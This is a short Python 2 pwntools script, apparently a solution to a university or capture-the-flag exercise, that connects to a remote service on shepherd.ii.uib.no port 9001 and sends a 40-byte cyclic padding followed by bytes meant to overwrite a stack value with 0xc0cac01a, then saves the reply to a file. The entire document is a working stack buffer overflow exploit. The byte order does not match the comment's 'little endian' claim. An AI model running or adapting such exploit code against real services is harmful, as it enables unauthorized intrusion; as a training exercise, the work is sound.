#!/usr/bin/python2
import pwn
from struct import *


desired_offset = 40 #thanks to gdb we can know the offset between rbp and rsp that is 40
c = pwn.remote('shepherd.ii.uib.no', 9001)



buf = ""
buf = pwn.cyclic(40)
buf += "\x00\x00\x00\x00\x1a\xc0\xca\xc0" #we add little endian c0cac01a


c.sendline(buf) #we sent the payload

f = open("out_1.txt", "w") #file where the results are going to save

f.write(c.recvall()) #receiving the results and writting them in out.txt.

